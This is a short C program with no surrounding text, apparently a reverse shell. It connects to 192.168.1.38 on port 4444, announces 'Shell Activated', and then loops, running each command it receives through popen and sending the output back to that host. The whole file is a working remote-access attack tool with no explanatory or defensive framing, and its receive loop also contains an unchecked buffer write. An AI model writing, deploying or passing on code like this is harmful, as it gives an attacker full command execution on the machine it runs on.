#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <errno.h>

int main()
{
    int sock_fd;
    struct sockaddr_in addr;
    char buffer[1024];
    int bytes_received;
    int conn_result;

    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_fd == -1)
    {
        printf("Error creating socket: %s\n", strerror(errno));
        exit(1);
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("192.168.1.38");
    addr.sin_port = htons(4444);

    conn_result = connect(sock_fd, (struct sockaddr *)&addr, sizeof(addr));
    if (conn_result == -1)
    {
        printf("Error connecting to remote host: %s\n", strerror(errno));
        exit(1);
    }

    send(sock_fd, "Shell Activated", strlen("Shell Activated"), 0);

    while (1)
    {
        bytes_received = recv(sock_fd, buffer, sizeof(buffer), 0);
        buffer[bytes_received] = '\0';

        FILE *fp;
        char cmd_output[1024];

        fp = popen(buffer, "r");
        if (fp == NULL)
        {
            printf("Error executing command\n");
            continue;
        }

        while (fgets(cmd_output, sizeof(cmd_output), fp) != NULL)
        {
            send(sock_fd, cmd_output, strlen(cmd_output), 0);
        }

        pclose(fp);
    }

    close(sock_fd);

    return 0;
}

